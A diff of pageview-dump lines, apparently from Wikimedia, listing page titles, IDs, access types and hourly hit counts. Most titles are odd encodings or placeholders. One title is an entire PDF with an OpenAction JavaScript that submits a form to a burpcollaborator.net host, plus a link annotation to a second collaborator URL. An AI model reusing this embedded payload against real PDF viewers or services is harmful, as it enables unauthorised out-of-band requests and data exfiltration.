@@ -25,3 +25,98 @@ en.wikipedia B̤ē 4889214 desktop 6 F5I1
 en.wikipedia 0-3-0 14287894 desktop 1 C1
 en.wikipedia 10.9 31104124 mobile-web 1 X1
 ar.wikipedia الأثر_الاقتصادي_لجائحة_فيروس_كورونا_2019–20 7429096 mobile-web 1 N1
+en.wikipedia %25D0%25A1%25D0%25BF%25D0%25B5%25D1%2586%25D1%2596%25D0%25B0%25D0%25BB%25D1%258C%25D0%25BD%25D0%25B0:%25D0%259F%25D0%25BE%25D1%2588%25D1%2583%25D0%25BA desktop 1 L1
+en.wikipedia %25D8%25AE%25D8%25A7%25D8%25B5:%25D8%25A8%25D8%25AD%25D8%25AB desktop 2 I1M1
+en.wikipedia %25D9%2588%25DB%258C%25DA%2598%25D9%2587:%25D8%25AC%25D8%25B3%25D8%25AA%25D8%25AC%25D9%2588 desktop 2 G2
+en.wikipedia %25E0%25B8%259E%25E0%25B8%25B4%25E0%25B9%2580%25E0%25B8%25A8%25E0%25B8%25A9:%25E0%25B8%2584%25E0%25B9%2589%25E0%25B8%2599%25E0%25B8%25AB%25E0%25B8%25B2 desktop 10 A3B6J1
+en.wikipedia %25E7%2589%25B9%25E5%2588%25A5:%25E6%25A4%259C%25E7%25B4%25A2 desktop 1 E1
+en.wikipedia %25ED%258A%25B9%25EC%2588%2598%25EA%25B8%25B0%25EB%258A%25A5%253A%25EC%25B0%25BE%25EA%25B8%25B0 desktop 3 E1M1U1
+en.wikipedia %25ED%258A%25B9%25EC%2588%2598%25EA%25B8%25B0%25EB%258A%25A5:%25EC%25B0%25BE%25EA%25B8%25B0 desktop 3 E1M1U1
+en.wikipedia %CONFIG% 349504 desktop 1 A1
+en.wikipedia %NDAY_OF_WEEK% 349504 desktop 1 U1
+en.wikipedia %PDF-1.3
+
+1_0_obj
+<</Type/Pages/Count_1/Kids[5_0_R]>>
+endobj
+
+2_0_obj
+<</Type/Catalog/OpenAction_9_0_R/Pages_1_0_R>>
+endobj
+
+3_0_obj
+<</Length_112>>
+stream
+1_0_0_-1_0_792_cm
+q
+1_0_0_-1_0_792_cm
+BT
+220_400_Td
+/F1_10_Tf
+(For_further_information_please_click_here)_Tj
+ET
+endstream
+endobj
+
+4_0_obj
+<</ProcSet[/PDF/Text/ImageB/ImageC/ImageI]/Font<</F1_6_0_R>>>>
+endobj
+
+5_0_obj
+<</Type/Page/Parent_1_0_R/MediaBox[0_0_612_792]/Contents_3_0_R/Resources_4_0_R/Annots[8_0_R]>>
+endobj
+
+6_0_obj
+<</Type/Font/BaseFont/Helvetica/Subtype/Type1/Encoding/WinAnsiEncoding>>
+endobj
+
+7_0_obj
+<</S/URI/URI_10_0_R>>
+endobj
+
+8_0_obj
+<</Subtype/Link/A_7_0_R/Type/Annot/Rect[0_0_889_792]/Border[0_0_0]>>
+endobj
+
+9_0_obj
+<<
+/S/JavaScript/JS(
+	if\(this.submitForm\){
+		this.submitForm\('http://sjfyltsecrbmoaakmus5x674fvlnij6b3zummab.burpcollaborator.net'\);
+		app.alert\("Script_executed"\);
+	}
+)
+/Next<</F<</F_10_0_R/FS/URL>>/S/SubmitForm>>
+>>
+endobj
+
+10_0_obj
+(http://b2eh4cbxvau57tt35dbogpqnye4612pvpjg68ux.burpcollaborator.net)
+endobj
+
+xref
+0_11
+0000000000_65536_f
+0000000010_00000_n
+0000000062_00000_n
+0000000125_00000_n
+0000000286_00000_n
+0000000365_00000_n
+0000000476_00000_n
+0000000565_00000_n
+0000000603_00000_n
+0000000688_00000_n
+0000000928_00000_n
+
+trailer
+<</Size_11/Root_2_0_R>>
+
+startxref
+1015
+%%EOF desktop 1 Q1
+en.wikipedia %SystemRoot% 349504 desktop 2 F1X1
+en.wikipedia %s 1578140 desktop 598 A26B20C25D14E24F18G10H9I18J13K18L17M17N22O25P31Q53R40S30T24U35V28W47X34
+en.wikipedia %s 1578140 mobile-web 392 A9B9C8D3E5F7G13H13I18J14K21L20M18N21O26P27Q29R16S29T27U32V14W8X5
+en.wikipedia & 59153 desktop 40 A2B3C1D1E8F1G1I1J1K3M1O1P1Q6R1S3V3X2
+en.wikipedia & 59153 mobile-web 7 D1F3R2U1
+en.wikipedia && 3892558 desktop 7 C1E1F1K2N1R1
